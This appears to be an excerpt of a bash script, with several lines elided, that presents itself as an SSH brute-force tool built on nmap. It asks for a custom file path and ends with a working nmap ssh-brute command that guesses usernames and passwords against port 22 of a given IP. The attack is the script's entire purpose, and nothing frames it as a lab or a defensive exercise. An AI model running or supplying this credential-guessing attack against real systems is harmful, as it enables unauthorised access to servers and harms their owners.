#! /bin/bash
echo -e "\e[97;101mSSH BRUTEFORCE TOOL BASED ON NMAP \e[0m" 
...
read -r -p "Would you like to import a custom file? [y/N] " response
...
then
	...
	echo "Paste here yout custom file path:"
	 ...
	 echo "Can't continue the script".
            exit 1
...
echo -e "All done, starting script:"
 ...
 nmap -p 22 --script ssh-brute --script-args userdb=$USER,passdb=$PASSWORD \
      --script-args ssh-brute.timeout=$Time"s" $IP
